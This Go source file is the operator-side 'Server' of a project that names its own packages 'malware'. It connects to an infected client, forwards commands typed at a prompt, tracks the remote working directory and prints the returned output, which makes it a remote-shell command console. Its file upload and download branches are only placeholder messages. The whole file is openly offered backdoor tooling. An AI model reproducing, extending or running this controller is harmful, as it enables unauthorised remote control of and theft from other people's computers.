package main

//Server

import (
	"bufio"
	"fmt"
	"log"
	network "malware/core/Network"
	utils "malware/core/Utils"
	"net"
	"os"
	"strings"
)

func main() {

	var conn net.Conn

	IP := "127.0.0.1"
	Port := "9090"

	conn, err := network.ConnectionWithClient(IP, Port)

	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	var userInput string

	command, _ := utils.Dencode(conn)
	currDir := strings.TrimSuffix(string(command.Data), "\n")
	for {

		reader := bufio.NewReader(os.Stdin)
		fmt.Printf("[%s] # ", currDir)
		userInput, err = reader.ReadString('\n')
		if err != nil {
			log.Fatal(err)
		}
		_, err := conn.Write([]byte(userInput))
		if err != nil {
			log.Fatal(err)
		}

		command, _ := utils.Dencode(conn)
		userCommand := strings.Split(userInput, " ")

		switch userCommand[0] {
		case "file":
			if len(userCommand) > 2 {
				switch userCommand[1] {
				case "download", "down":
					fmt.Println("downloading file ....")
					continue
				case "upload", "up":
					fmt.Println("uploading file ....")
					continue
				}
			}
		case "cd":
			currDir = strings.TrimSuffix(string(command.Data), "\n")
			continue
		}

		fmt.Println(string(command.Data))
	}
}
